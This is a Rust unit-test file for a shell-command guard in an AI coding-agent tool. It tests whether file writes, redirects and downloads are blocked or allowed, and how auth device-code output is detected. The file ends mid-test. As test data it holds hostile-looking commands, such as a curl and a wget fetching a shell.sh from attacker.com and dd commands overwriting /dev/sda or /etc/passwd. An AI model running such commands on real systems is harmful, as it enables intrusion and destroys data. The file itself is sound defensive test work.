//! Unit tests for the ctx_shell guard, compression and auth-flow detection.
//!
//! Split out of `ctx_shell.rs` (#1768 grew it past the 1500-line LOC gate).
//! The module is unchanged otherwise: `super` still resolves to `ctx_shell`,
//! so every assertion keeps reaching the private items it pins.

use super::*;

#[test]
fn normalize_cmd_no_change_on_unix() {
    if cfg!(windows) {
        return;
    }
    assert_eq!(
        normalize_command_for_shell("cd /tmp; ls -la"),
        "cd /tmp; ls -la"
    );
}

#[test]
fn validate_allows_safe_commands() {
    assert!(validate_command("git status").is_none());
    assert!(validate_command("cargo test").is_none());
    assert!(validate_command("npm run build").is_none());
    assert!(validate_command("ls -la").is_none());
}

#[test]
fn validate_blocks_file_writes() {
    assert!(validate_command("echo 'data' > output.txt").is_some());
    assert!(validate_command("tee output.txt").is_some());
    assert!(validate_command("printf 'hello' > test.txt").is_some());
}

#[test]
#[cfg(unix)]
fn validate_allows_literal_temp_redirect_and_tee_targets() {
    let paths = crate::core::config::default_shell_write_allow_paths();
    assert!(
        validate_command_with_write_allow_paths(
            "go test ./... > /private/tmp/agent-test.log 2>&1",
            &paths,
            None
        )
        .is_none()
    );
    assert!(
        validate_command_with_write_allow_paths("tee /private/tmp/agent-test.log", &paths, None)
            .is_none()
    );
    assert!(
        validate_command_with_write_allow_paths(
            "go test ./... | tee /private/tmp/agent-test.log",
            &paths,
            None
        )
        .is_none()
    );
}

#[test]
fn validate_blocks_redirects_and_piped_tee_into_project_root() {
    // #1778: the test supplies both sides of the comparison (this path is passed
    // as `project_root` below), so it needs *a* real absolute directory, not the
    // process cwd — which other tests mutate via `set_current_dir` while this one
    // runs in parallel.
    let root = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let target = root.join("agent-test.log");
    let target = target.to_string_lossy();
    let paths = crate::core::config::default_shell_write_allow_paths();
    assert!(
        validate_command_with_write_allow_paths(
            &format!("echo output > {target}"),
            &paths,
            Some(root.to_string_lossy().as_ref())
        )
        .is_some()
    );
    assert!(
        validate_command_with_write_allow_paths(
            &format!("go test | tee {target}"),
            &paths,
            Some(root.to_string_lossy().as_ref())
        )
        .is_some()
    );
}

#[test]
#[cfg(unix)]
fn validate_allows_configured_external_write_path() {
    let paths = vec!["/var/agent-scratch".to_string()];
    assert!(
        validate_command_with_write_allow_paths(
            "go test ./... >> /var/agent-scratch/gotest.log",
            &paths,
            Some("/workspace/project")
        )
        .is_none()
    );
    assert!(
        validate_command_with_write_allow_paths(
            "go test ./... | tee /var/agent-scratch/gotest.log",
            &paths,
            Some("/workspace/project")
        )
        .is_none()
    );
    assert!(
        validate_command_with_write_allow_paths(
            "echo output > /var/other/gotest.log",
            &paths,
            Some("/workspace/project")
        )
        .is_some()
    );
}

#[test]
fn validate_blocks_heredoc_with_file_redirect() {
    assert!(validate_command("cat > file.py <<'EOF'\nprint('hi')\nEOF").is_some());
    assert!(validate_command("cat <<EOF > output.txt\nhello\nEOF").is_some());
    assert!(validate_command("cat <<'END' >> logfile.txt\ndata\nEND").is_some());
}

#[test]
fn validate_allows_heredoc_without_file_redirect() {
    assert!(validate_command("cat <<EOF\nhello world\nEOF").is_none());
    assert!(validate_command("psql -d mydb <<EOF\nSELECT 1;\nEOF").is_none());
    assert!(validate_command("git commit -m \"$(cat <<'EOF'\nfix: something\nEOF\n)\"").is_none());
    assert!(validate_command("grep pattern <<EOF\nfoo\nbar\nEOF").is_none());
}

#[test]
fn validate_blocks_oversized_commands() {
    let huge = "x".repeat(MAX_COMMAND_BYTES + 1);
    let result = validate_command(&huge);
    assert!(result.is_some());
    assert!(result.unwrap().contains("too large"));
}

#[test]
fn validate_allows_cat_without_redirect() {
    assert!(validate_command("cat file.txt").is_none());
}

// --- GH #903: literal `>` in quoted prose is not a redirect ---

#[test]
fn validate_allows_escaped_quotes_with_angle_brackets() {
    // `\"` inside a double-quoted string must not toggle quote state;
    // the `>` in `<root>` is quoted data, not a redirect.
    assert!(
        validate_command(
            "gh issue comment 1 --body \"$(printf 'says \\\"root: <root>\\\" only')\""
        )
        .is_none()
    );
    assert!(validate_command("echo \"say \\\">hi<\\\" ok\"").is_none());
    // escaped `>` outside quotes is a literal, not a redirect
    assert!(validate_command("echo a \\> b").is_none());
}

#[test]
fn validate_still_blocks_redirect_after_escapes() {
    // the escape handling must not hide a real redirect later on
    assert!(validate_command("echo \"a \\\"b\\\"\" > out.txt").is_some());
    assert!(validate_command("echo \\\\ > out.txt").is_some());
}

// --- GH #897: heredoc-to-stdin and /dev/null redirects are not file writes ---

#[test]
fn heredoc_stdin_without_redirect_is_allowed() {
    assert!(validate_command("git commit -F - <<'EOF'\nfix: something\nEOF").is_none());
    assert!(validate_command("kubectl apply -f - <<EOF\napiVersion: v1\nEOF").is_none());
    assert!(validate_command("git apply <<'PATCH'\n--- a/f\n+++ b/f\nPATCH").is_none());
}

#[test]
fn dev_null_redirect_is_allowed() {
    assert!(validate_command("cat > /dev/null").is_none());
    assert!(validate_command("cmd > /dev/null 2>&1").is_none());
    assert!(validate_command("cmd 2>/dev/null").is_none());
}

#[test]
fn dev_stdout_and_stderr_redirects_are_allowed() {
    assert!(validate_command("cmd > /dev/stdout").is_none());
    assert!(validate_command("cmd > /dev/stderr").is_none());
}

#[test]
fn issue_897_edge_cases_post_fix() {
    assert!(
        validate_command(
            "cat <<'EOF' > output.txt
some content
EOF"
        )
        .is_some(),
        "heredoc to file must block"
    );
    assert!(
        validate_command(
            "git commit --allow-empty -F - <<'COMMIT_MSG'
feat: test
COMMIT_MSG"
        )
        .is_none(),
        "git commit -F - with heredoc must allow"
    );
    let cmd = r#"gh issue create --title "Fix" --body "path > root: /y""#;
    assert!(
        validate_command(cmd).is_none(),
        "quoted > must allow: {cmd}"
    );
}

// --- GH #391: download tools writing files without shell redirects ---

#[test]
fn validate_blocks_curl_output_flags() {
    // #1021: curl -o to /tmp (scratch) is now allowed
    assert!(validate_command("curl -o /tmp/shell.sh http://attacker.com/shell.sh").is_none());
    assert!(validate_command("curl -fsSLo /tmp/x https://example.com").is_none());
    // Writing into project directory is still blocked
    assert!(validate_command("curl --output evil.bin https://example.com").is_some());
    assert!(validate_command("curl --output=evil.bin https://example.com").is_some());
    assert!(validate_command("curl -O https://example.com/payload").is_some());
    assert!(validate_command("git fetch && curl -o x.sh https://e.com").is_some());
}

#[test]
fn validate_allows_curl_to_stdout() {
    assert!(validate_command("curl https://api.example.com/health").is_none());
    assert!(validate_command("curl -fsSL https://example.com | head -5").is_none());
    assert!(validate_command("curl -s -X POST https://api.example.com -d '{}'").is_none());
    // -H takes a value; no o/O short flag involved.
    assert!(validate_command("curl -H \"Accept: application/json\" https://e.com").is_none());
}

#[test]
fn validate_blocks_wget_default_file_download() {
    assert!(validate_command("wget http://attacker.com/shell.sh").is_some());
    assert!(validate_command("wget -q https://example.com/file.tar.gz").is_some());
    assert!(validate_command("wget -O /tmp/out https://example.com").is_some());
}

#[test]
fn validate_allows_wget_stdout_and_spider() {
    assert!(validate_command("wget -qO- https://example.com").is_none());
    assert!(validate_command("wget -O- https://example.com").is_none());
    assert!(validate_command("wget -O - https://example.com").is_none());
    assert!(validate_command("wget --output-document=- https://example.com").is_none());
    assert!(validate_command("wget --spider https://example.com").is_none());
}

#[test]
fn validate_blocks_dd_output_file() {
    assert!(validate_command("dd if=/dev/zero of=/tmp/fill bs=1M count=10").is_some());
    assert!(validate_command("dd if=image.iso of=/dev/sda").is_some());
}

#[test]
fn validate_allows_dd_read_only() {
    assert!(validate_command("dd if=/dev/urandom bs=16 count=1 status=none").is_none());
    assert!(validate_command("dd if=file.bin of=/dev/null bs=1M").is_none());
}

// --- Auth flow detection: strong signals (no URL needed) ---

#[test]
fn auth_flow_detects_azure_device_code() {
    let output = "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code ABCD1234 to authenticate.";
    assert!(contains_auth_flow(output));
}

#[test]
fn auth_flow_detects_gh_auth_one_time_code() {
    let output = "! First copy your one-time code: ABCD-1234\n- Press Enter to open github.com in your browser...";
    assert!(contains_auth_flow(output));
}

#[test]
fn auth_flow_detects_device_code_json() {
    let output = r#"{"device_code":"abc123","user_code":"ABCD-1234","verification_uri":"https://example.com/activate"}"#;
    assert!(contains_auth_flow(output));
}

#[test]
fn auth_flow_detects_verification_uri_field() {
    let output =
        r#"{"verification_uri": "https://login.microsoftonline.com/common/oauth2/deviceauth"}"#;
    assert!(contains_auth_flow(output));
}

#[test]
fn auth_flow_detects_user_code_field() {
    let output = r#"{"user_code": "FGHJK-LMNOP", "expires_in": 900}"#;
    assert!(contains_auth_flow(output));
}

// --- Auth flow detection: weak signals (require URL) ---

#[test]
fn auth_flow_detects_gcloud_with_url() {
    let output = "Go to the following link in your browser:\n\n    https://accounts.google.com/o/oauth2/auth?response_type=code\n\nEnter verification code: ";
    assert!(contains_auth_flow(output));
}

#[test]
fn auth_flow_detects_aws_sso_with_url() {
    let output = "If the browser does not open, open the following URL:\nhttps://device.sso.us-east-1.amazonaws.com/\n\nThen enter the code:\nABCD-EFGH";
    assert!(contains_auth_flow(output));
}

#[test]
fn auth_flow_detects_firebase_with_url() {
    let output = "Visit this URL on this device to log in:\nhttps://accounts.google.com/o/oauth2/auth?...\n\nWaiting for authentication...";
    assert!(contains_auth_flow(output));
}

#[test]
fn auth_flow_detects_generic_browser_open_with_url() {
    let output =
        "Open your browser to https://login.example.com/device and enter the code XYZW-1234";
    assert!(contains_auth_flow(output));
}

// --- False positive protection ---

#[test]
fn auth_flow_ignores_normal_build_output() {
    let output = "Compiling lean-ctx v2.21.9\nFinished release profile\n";
    assert!(!contains_auth_flow(output));
}

#[test]
fn auth_flow_ignores_git_output() {
    let output = "On branch main\nYour branch is up to date with 'origin/main'.\nnothing to commit, working tree clean";
    assert!(!contains_auth_flow(output));
}

#[test]
fn auth_flow_ignores_npm_install_output() {
    let output = "added 150 packages in 3s\n\n24 packages are looking for funding\n  run `npm fund` for details\nhttps://npmjs.com/package/lean-ctx";
    assert!(!contains_auth_flow(output));
}

#[test]
fn auth_flow_ignores_docs_mentioning_auth() {
    let output = "The authorization code grant type is the most common OAuth flow.\nSee https://oauth.net/2/grant-types/ for details.";
    assert!(!contains_auth_flow(output));
}

#[test]
fn auth_flow_weak_signal_requires_url() {
    let output = "Please enter the code ABC123 in the terminal";
    assert!(!contains_auth_flow(output));
}

#[test]
fn auth_flow_weak_signal_without_url_is_ignored() {
    let output = "Waiting for authentication to complete... done!";
    assert!(!contains_auth_flow(output));
}

#[test]
fn auth_flow_ignores_virtualenv_activate() {
    let output = "Created virtualenv at .venv\nRun: source .venv/bin/activate";
    assert!(!contains_auth_flow(output));
}

#[test]
fn auth_flow_ignores_api_response_with_code_field() {
    let output = r#"{"status": "ok", "code": 200, "message": "success"}"#;
    assert!(!contains_auth_flow(output));
}

// --- Integration: handle() preserves auth flow ---

#[test]
fn handle_preserves_auth_flow_output_fully() {
    let output = "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code ABCD1234 to authenticate.\nWaiting for you...\nLine 3\nLine 4\nLine 5\nLine 6\nLine 7\nLine 8\nLine 9\nLine 10\nLine 11\nLine 12\nLine 13";
    // az login is Passthrough via OutputPolicy, so all content is preserved
    let result = handle("az login --use-device-code", output, 0, CrpMode::Off);
    assert!(result.contains("ABCD1234"), "auth code must be preserved");
    assert!(result.contains("devicelogin"), "URL must be preserved");
    assert!(
        result.contains("Line 13"),
        "all lines must be preserved (no truncation)"
    );
}

#[test]
fn handle_compresses_normal_output_not_auth() {
    let lines: Vec<String> = (1..=20).map(|i| format!("Line {i} of output")).collect();
    let output = lines.join("\n");
    let result = handle("some-tool check", &output, 0, CrpMode::Off);
    assert!(
        !result.contains("auth/device-code flow detected"),
        "normal output must not trigger auth detection"
    );
    assert!(
        result.len() < output.len() + 100,
        "normal output should be compressed, not inflated"
    );
}

#[test]
fn is_search_command_detects_grep() {
    assert!(is_search_command("grep -r pattern src/"));
    assert!(is_search_command("rg pattern src/"));
    assert!(is_search_command("find . -name '*.rs'"));
    assert!(is_search_command("fd pattern"));
    assert!(is_search_command("ag pattern src/"));
    assert!(is_search_command("ack pattern"));
}

#[test]
fn is_search_command_rejects_non_search() {
    assert!(!is_search_command("cargo build"));
    assert!(!is_search_command("git status"));
    assert!(!is_search_command("npm install"));
    assert!(!is_search_command("cat file.rs"));
}

#[test]
fn generic_compress_preserves_short_output() {
    let lines: Vec<String> = (1..=20).map(|i| format!("Line {i}")).collect();
    let output = lines.join("\n");
    let result = generic_compress(&output);
    assert_eq!(result, output);
}

#[test]
fn generic_compress_scales_with_length() {
    let lines: Vec<String> = (1..=60).map(|i| format!("Line {i}")).collect();
    let output = lines.join("\n");
    let result = generic_compress(&output);
    assert!(result.contains("truncated"));
    let shown_count = result.lines().count();
    assert!(
        shown_count > 10,
        "should show more than old 6-line limit, got {shown_count}"
    );
    assert!(shown_count < 60, "should be truncated, not full output");
}

#[test]
fn handle_preserves_search_results() {
    let lines: Vec<String> = (1..=30)
        .map(|i| format!("src/file{i}.rs:42: fn search_result()"))
        .collect();
    let output = lines.join("\n");
    let result = handle("rg search_result src/", &output, 0, CrpMode::Off);
    for i in 1..=30 {
        assert!(
            result.contains(&format!("file{i}")),
            "search result file{i} should be preserved in output"
        );
    }
}

// --- GH #931: unquoted heredoc body > must not trip redirect scanner ---

#[test]
fn unquoted_heredoc_gt_in_body_not_blocked() {
    let cmd = "psql <<SQL\nSELECT * FROM t WHERE x > 0;\nSQL";
    assert!(
        validate_command(cmd).is_none(),
        "unquoted heredoc body with > must not be flagged as redirect"
    );
}

#[test]
fn unquoted_heredoc_append_in_body_not_blocked() {
    let cmd = "cat <<END\nline with >> inside\nEND";
    assert!(
        validate_command(cmd).is_none(),
        "unquoted heredoc body with >> must not be flagged"
    );
}

// --- GH #1142: literal scratch paths outside project root ---

// Since #1467, Unix scratch prefixes (/tmp, /private/tmp, /var/tmp) are
// recognised cross-platform — agents generate `/tmp` redirects even on
// Windows (Git Bash, WSL).
#[test]
fn issue_1142_private_tmp_redirect_allowed() {
    // exact repro from the issue: capture test log under /private/tmp scratchpad
    assert!(
        validate_command(
            "go test ./... > /private/tmp/claude-502/scratchpad/gotest.log 2>&1; echo EXIT:$?"
        )
        .is_none()
    );
    assert!(validate_command("cargo test > /var/tmp/out.log 2>&1").is_none());
    assert!(validate_command("make 2>> /private/tmp/err.log").is_none());
    // quoted targets must be judged like unquoted ones
    assert!(validate_command("cargo test > \"/private/tmp/x/build.log\"").is_none());
}

#[test]
fn issue_1142_quoted_scratch_target_allowed() {
    // quoted targets must be judged like unquoted ones
    assert!(validate_command("cargo test > \"$TMPDIR/build.log\"").is_none());
    assert!(validate_command("cargo test > '$SCRATCH/build.log'").is_none());
}

#[test]
fn issue_1142_fd_dup_allowed() {
    assert!(validate_command("echo error >&2").is_none());
    assert!(validate_command("printf 'x' 1>&2 && git status").is_none());
}

#[test]
fn issue_1142_project_writes_still_blocked() {
    assert!(validate_command("cargo test > build.log").is_some());
    assert!(validate_command("echo x > /Users/me/project/out.txt").is_some());
    assert!(validate_command("echo x > \"./out.txt\"").is_some());
    // /tmpfoo is not a temp dir
    assert!(validate_command("echo x > /private/tmpfoo/out.txt").is_some());
}

#[test]
fn issue_1142_noclobber_to_scratch_allowed() {
    assert!(validate_command("cargo test >|/tmp/out.log").is_none());
    assert!(validate_command("echo x >|out.txt").is_some());
}

#[test]
fn real_redirect_after_heredoc_still_blocked() {
    let cmd = "cat <<EOF > output.txt\ndata\nEOF";
    assert!(
        validate_command(cmd).is_some(),
        "redirect OUTSIDE heredoc body must still block"
    );
}

// --- GH #1467: /tmp writes must be allowed on every platform ---

#[test]
fn issue_1467_tmp_redirect_cross_platform() {
    assert!(
        validate_command("wc -l /some/file > /tmp/result.txt").is_none(),
        "/tmp redirect must be allowed on every platform"
    );
    assert!(
        validate_command("grep pattern file.txt > /tmp/matches.log 2>&1").is_none(),
        "/tmp redirect with stderr merge must be allowed"
    );
    assert!(
        validate_command("cat large.csv > /var/tmp/subset.csv").is_none(),
        "/var/tmp redirect must be allowed cross-platform"
    );
}

#[test]
fn issue_1467_non_tmp_still_blocked() {
    assert!(
        validate_command("echo secret > /tmpfoo/leak.txt").is_some(),
        "/tmpfoo is not /tmp — must be blocked"
    );
}

// --- GH #1671: the tee refusal names the rule that produced it ---

/// The message said "tee without pipe" and then, one sentence later, that
/// piped tee is allowed — rejecting a command while describing it as
/// permitted. The rule is the destination.
#[test]
fn the_tee_refusal_does_not_contradict_itself() {
    let msg = validate_command_with_write_allow_paths(
        "echo hi | tee /Users/me/proj/dist/index.html",
        &[],
        Some("/Users/me/proj"),
    )
    .expect("a project destination is refused");

    assert!(
        !msg.contains("without pipe"),
        "the command is piped; naming the pipe is the wrong reason: {msg}"
    );
    assert!(
        !msg.contains("Piped tee (cmd | tee file) is allowed"),
        "must not call the rejected form permitted: {msg}"
    );
    assert!(
        msg.contains("/Users/me/proj/dist/index.html"),
        "name the destination that caused it: {msg}"
    );
    assert!(
        msg.contains("destination"),
        "state the rule that produced the verdict: {msg}"
    );
}

/// Every form the reporter tried is judged the same way, so the message
/// must not send the caller off to restructure the pipeline.
#[test]
fn the_pipe_position_never_changes_the_tee_verdict() {
    for cmd in [
        "tee /Users/me/proj/out.txt",
        "echo hi | tee /Users/me/proj/out.txt",
        "echo hi | tee /Users/me/proj/out.txt | wc -l",
    ] {
        let msg = validate_command_with_write_allow_paths(cmd, &[], Some("/Users/me/proj"))
            .unwrap_or_else(|| panic!("must be refused: {cmd}"));
        assert!(msg.contains("Piping makes no difference"), "{cmd}: {msg}");
    }
    // A scratch destination stays allowed, piped or not.
    for cmd in ["tee /tmp/probe.txt", "echo hi | tee /tmp/probe.txt"] {
        assert!(
            validate_command_with_write_allow_paths(cmd, &[], Some("/Users/me/proj")).is_none(),
            "{cmd}"
        );
    }
}

// --- GH #1672: a heredoc body is data, not a command ---

/// Found live: a commit message quoting the guard's own advice was refused
/// as if it were a download. Nothing runs inside a heredoc body.
#[test]
fn a_download_flag_inside_a_heredoc_body_is_not_a_download() {
    let commit = "git commit -F - <<'MSG'\n\
             fix(x): something\n\
             \n\
             The reported case: cd /scratch && curl -sL -o shot.png https://e/x\n\
             MSG";
    assert!(
        validate_command(commit).is_none(),
        "a heredoc body is opaque data: {:?}",
        validate_command(commit)
    );

    for body in [
        "cat <<'EOF'\nwget https://example.com/a.tar.gz\nEOF",
        "cat <<'EOF'\ndd if=/dev/zero of=/etc/passwd\nEOF",
    ] {
        assert!(validate_command(body).is_none(), "{body}");
    }
}

/// The guard itself is untouched: a real download outside a heredoc, and
/// one on the same line as a heredoc redirection, are still refused.
#[test]
fn a_real_download_beside_a_heredoc_is_still_blocked() {
    assert!(
        validate_command("curl -sL -o shot.png https://e/x && cat <<'EOF'\nharmless\nEOF")
            .is_some()
    );
    assert!(
        validate_command("cat <<'EOF'\nharmless\nEOF\ncurl -sL -o shot.png https://e/x").is_some()
    );
}

// --- GH #1661: a relative download target is judged where it lands ---

/// The reported case: `cd <scratchpad> && curl -o shot.png <url>`. The
/// destination is inside the sanctioned scratch directory, but as the bare
/// string `shot.png` it read as a project write — so fetching a binary had
/// no in-tool route at all and pushed the agent to native shell.
#[test]
fn a_relative_download_into_a_scratch_directory_is_allowed() {
    for cmd in [
        "cd /tmp && curl -sL -o shot.png https://example.com/a.png",
        "cd /private/tmp/claude-501/session && curl -sL -o shot.png https://e/x",
        "cd /tmp/work && curl -sL -o sub/shot.png https://e/x",
    ] {
        assert!(
            download_to_file_reason(cmd).is_none(),
            "scratch destination must stay reachable: {cmd}"
        );
    }
}

/// The #391 boundary is untouched: a relative target outside a scratch
/// directory — or one this cannot resolve — is still a file write.
#[test]
fn a_download_into_the_project_is_still_blocked() {
    for cmd in [
        "curl -sL -o shot.png https://example.com/a.png",
        "cd /Users/me/project && curl -sL -o shot.png https://e/x",
        "cd \"$SCRATCH\" && curl -sL -o shot.png https://e/x",
        "cd /tmp && curl -sL -o /Users/me/project/shot.png https://e/x",
        "wget https://example.com/a.tar.gz",
        "dd if=/dev/zero of=/Users/me/project/block.bin",
        // wget/dd keep no scratch carve-out at all — a documented,
        // separately tested decision this fix deliberately leaves alone.
        "cd /tmp && wget -O page.html https://e/x",
        "cd /tmp && dd if=/dev/zero of=block.bin bs=1 count=1",
    ] {
        assert!(
            download_to_file_reason(cmd).is_some(),
            "must stay blocked: {cmd}"
        );
    }
}

/// The refusal has to name a route that works for the payload at hand.
/// Both suggested fallbacks were text-only, so for an image the message
/// left native Bash as the only way forward.
#[test]
fn the_refusal_names_a_route_that_works_for_binaries() {
    let msg = validate_command("curl -sL -o shot.png https://example.com/a.png").expect("blocked");
    assert!(msg.contains("scratch"), "{msg}");
    assert!(msg.contains("/tmp/"), "{msg}");
}

// --- GH #1659: the redirect verdict must not depend on position ---

/// The reporter's table, verbatim. The target was read up to whitespace, so
/// a trailing `;` became part of it (`/dev/null;`), the exemption missed,
/// and the identical redirect was blocked in a non-final segment.
#[test]
fn dev_null_is_exempt_in_every_position() {
    for cmd in [
        "echo hi 1>/dev/null",
        "echo a; echo b 1>/dev/null",
        "echo hi 1>/dev/null; echo ok",
        "echo a 1>/dev/null; echo b; echo c",
        "diff -q /etc/hosts /etc/hosts 1>/dev/null && echo SAME",
        "echo hi 1>/dev/null && echo ok",
        "echo hi >/dev/null; echo ok",
        "echo hi >/dev/null | cat",
        "(echo hi >/dev/null); echo ok",
    ] {
        assert!(
            !has_file_write_redirect(cmd, &[], None),
            "/dev/null is never a file write: {cmd}"
        );
    }
}

/// A redirect operator can carry one more character (`>|` noclobber
/// override, `>&` fd duplication). Terminating the word at metacharacters
/// must not swallow those — nor may it empty out a process-substitution
/// target, since an empty target falls through unblocked.
#[test]
fn redirect_operator_suffixes_keep_their_meaning() {
    for allowed in [
        "echo x >&1",
        "echo x >&2; echo ok",
        "echo x >&-",
        "echo x 1>&2 | cat",
    ] {
        assert!(
            !has_file_write_redirect(allowed, &[], None),
            "fd duplication is not a file write: {allowed}"
        );
    }
    for blocked in [
        "echo x >|out.txt",
        "echo x >|out.txt; echo ok",
        "echo x > >(tee out.txt)",
        "echo x > >(tee out.txt); echo ok",
    ] {
        assert!(
            has_file_write_redirect(blocked, &[], None),
            "still a file write: {blocked}"
        );
    }
}

/// The guard itself must not weaken: a real file target is still a write,
/// including in a non-final segment, which is the position the bug made
/// *over*-strict rather than under.
#[test]
fn a_real_file_target_is_still_a_write_in_any_position() {
    for cmd in [
        "echo hi > out.txt",
        "echo hi > out.txt; echo ok",
        "echo a; echo hi >> out.txt; echo b",
        "echo hi > out.txt && echo ok",
    ] {
        assert!(
            has_file_write_redirect(cmd, &[], None),
            "a file write must still be caught: {cmd}"
        );
    }
}

/// #1768: the refusal must state the rule that actually fired — the
/// destination — and must not offer a size rationale the guard does not
/// apply. The reporter's pair: two bytes into a project path is refused,
/// 1.3 MB into /tmp is allowed.
#[test]
fn redirect_refusal_names_the_destination_not_a_size() {
    let allow = vec!["/tmp".to_string()];
    let message = validate_command_with_write_allow_paths(
        "printf 'x\n' >> /project/lc_probe.txt",
        &allow,
        Some("/project"),
    )
    .expect("a project-path redirect is refused");

    assert!(
        message.contains("/project/lc_probe.txt"),
        "the refusal must name the target that tripped it: {message}"
    );
    assert!(
        message.contains("destination decides"),
        "the refusal must state the rule that fired: {message}"
    );
    for misleading in ["large payload", "large payloads", "protocol corruption"] {
        assert!(
            !message.contains(misleading),
            "a size rationale must not survive — the guard never weighs size: {message}"
        );
    }
    assert!(
        message.contains("/tmp"),
        "the reachable alternative must be named: {message}"
    );

    // The other half of the pair: a large capture into scratch stays
    // allowed, so the message above cannot be read as "redirects are
    // banned".
    assert!(
        validate_command_with_write_allow_paths(
            "seq 1 200000 > /tmp/lc_probe_big.txt",
            &allow,
            Some("/project"),
        )
        .is_none(),
        "a scratch capture must stay allowed regardless of payload size"
    );
}

/// The target is reported verbatim, so a caller can match it against the
/// command they sent — including the `>>` form and a non-final segment.
#[test]
fn disallowed_redirect_target_is_reported_verbatim() {
    assert_eq!(
        disallowed_write_redirect_target("echo hi > out.txt", &[], None, None).as_deref(),
        Some("out.txt")
    );
    assert_eq!(
        disallowed_write_redirect_target(
            "echo a; echo hi >> logs/run.log; echo b",
            &[],
            None,
            None
        )
        .as_deref(),
        Some("logs/run.log")
    );
    assert_eq!(
        disallowed_write_redirect_target("echo x >&1", &[], None, None),
        None,
        "fd duplication names no file"
    );
}

// --- #1811: the destination decides, so a relative target gets placed first ---

/// The reported case: a relative target under a scratch `cwd` was blocked while
/// the identical absolute path was allowed, and the refusal claimed "the
/// destination decides" about a destination it had never resolved.
#[test]
fn relative_target_under_scratch_cwd_is_allowed() {
    let paths = vec!["/private/tmp".to_string()];
    assert!(
        validate_command_in_cwd(
            "echo x > probe.txt",
            &paths,
            Some("/repo"),
            Some("/private/tmp/scratch"),
        )
        .is_none(),
        "a relative target resolving into a scratch path must be allowed"
    );
}

/// The direction that matters more: resolving must not become a loophole. A
/// relative target under a *project* cwd now resolves into the project and is
/// refused on the same rule as an absolute one.
#[test]
fn relative_target_under_project_cwd_stays_blocked() {
    let paths = vec!["/private/tmp".to_string()];
    for command in [
        "echo x > probe.txt",
        "echo x >> logs/run.log",
        "echo x | tee probe.txt",
    ] {
        assert!(
            validate_command_in_cwd(command, &paths, Some("/repo"), Some("/repo/sub"),).is_some(),
            "{command}: a relative target inside the project must stay blocked"
        );
    }
}

/// `..` must not walk out and back in unnoticed: the comparison resolves the
/// joined path, so traversal landing inside the project is still refused.
#[test]
fn relative_traversal_back_into_the_project_stays_blocked() {
    let paths = vec!["/private/tmp".to_string()];
    assert!(
        validate_command_in_cwd(
            "echo x > ../src/main.rs",
            &paths,
            Some("/repo"),
            Some("/repo/sub"),
        )
        .is_some(),
        "traversal that lands back inside the project must stay blocked"
    );
}

/// Without a cwd nothing changes: a relative target cannot be placed, so it
/// keeps the pre-existing conservative refusal.
#[test]
fn relative_target_without_cwd_keeps_the_old_refusal() {
    let paths = vec!["/private/tmp".to_string()];
    assert!(validate_command_in_cwd("echo x > probe.txt", &paths, Some("/repo"), None).is_some());
}

/// A cwd outside both the project and the allow-list is not a licence to write
/// there — the allow-list decides, the cwd only places the target.
#[test]
fn relative_target_under_unlisted_cwd_stays_blocked() {
    let paths = vec!["/private/tmp".to_string()];
    assert!(
        validate_command_in_cwd(
            "echo x > probe.txt",
            &paths,
            Some("/repo"),
            Some("/somewhere/else"),
        )
        .is_some(),
        "cwd places the target; it does not allow-list it"
    );
}

/// #1850, the false block: the call runs in the project, but `cd` moves the
/// redirect into scratch. Judged against the call's cwd, `out.txt` looked like
/// a project write.
#[test]
fn a_cd_into_scratch_places_a_relative_target_in_scratch() {
    let paths = vec!["/private/tmp".to_string()];
    for command in [
        "cd /private/tmp/work && echo x > out.txt",
        "cd /private/tmp/work && go test ./... | tee run.log",
        "cd /private/tmp && cd work && echo x >> out.txt",
    ] {
        assert!(
            validate_command_in_cwd(command, &paths, Some("/repo"), Some("/repo")).is_none(),
            "{command}: the target lands in scratch and must be allowed"
        );
    }
}

/// #1850, the direction that matters more: from a scratch cwd, `cd` into the
/// project must not smuggle a relative target past the guard.
#[test]
fn a_cd_into_the_project_keeps_a_relative_target_blocked() {
    let paths = vec!["/private/tmp".to_string()];
    for command in [
        "cd /repo && echo hi > f",
        "cd /repo/src && echo hi >> lib.rs",
        "cd /repo && echo hi | tee f",
        "cd ../../../repo && echo hi > f",
    ] {
        assert!(
            validate_command_in_cwd(command, &paths, Some("/repo"), Some("/private/tmp/s"))
                .is_some(),
            "{command}: the target lands in the project and must be refused"
        );
    }
}

/// Wherever the directory is not certain, a relative target is refused — even
/// though every one of these starts from a scratch cwd, because each can end up
/// running in the project.
#[test]
fn a_relative_target_after_an_uncertain_cd_is_refused() {
    let paths = vec!["/private/tmp".to_string()];
    for command in [
        // May not have run, or may have failed and fallen through.
        "true || cd /private/tmp/x && echo hi > f",
        "cd /private/tmp/missing && true; echo hi > f",
        "cd /private/tmp/missing && true || echo hi > f",
        "cd /private/tmp/missing || echo failed; echo hi > f",
        "false && cd /private/tmp/x; echo hi > f",
        // Moves the shell in a way the text does not spell out.
        "pushd /repo && echo hi > f",
        "builtin cd /repo && echo hi > f",
        "{ cd /repo; } && echo hi > f",
        "for d in a; do cd /repo; done; echo hi > f",
        "cd \"$PROJECT\" && echo hi > f",
    ] {
        assert!(
            validate_command_in_cwd(command, &paths, Some("/repo"), Some("/private/tmp/s"))
                .is_some(),
            "{command}: the directory is not certain, so a relative target must be refused"
        );
    }
}

/// A `cd` in a background job or a subshell moves nothing after it, so the
/// target stays where the call runs — in the project here.
#[test]
fn a_cd_that_cannot_move_the_shell_does_not_move_the_target() {
    let paths = vec!["/private/tmp".to_string()];
    for command in [
        "cd /private/tmp/x && true & echo hi > f",
        "(cd /private/tmp/x && make) && echo hi > f",
    ] {
        assert!(
            validate_command_in_cwd(command, &paths, Some("/repo"), Some("/repo")).is_some(),
            "{command}: the target still lands in the project"
        );
    }
}

/// `cd x || exit` is how scripts make a `cd` certain; what follows runs in `x`.
#[test]
fn cd_or_exit_makes_the_directory_certain() {
    let paths = vec!["/private/tmp".to_string()];
    assert!(
        validate_command_in_cwd(
            "cd /private/tmp/work || exit 1; echo x > out.txt",
            &paths,
            Some("/repo"),
            Some("/repo"),
        )
        .is_none()
    );
}

/// `cd <dir>; …` runs the next command either way, so it only moves the target
/// when the directory exists and the `cd` cannot fail.
#[test]
#[cfg(unix)]
fn cd_then_semicolon_follows_an_existing_directory_only() {
    let scratch = tempfile::tempdir().expect("tempdir");
    let dir = scratch.path().to_string_lossy().into_owned();
    let paths = vec![dir.clone()];
    assert!(
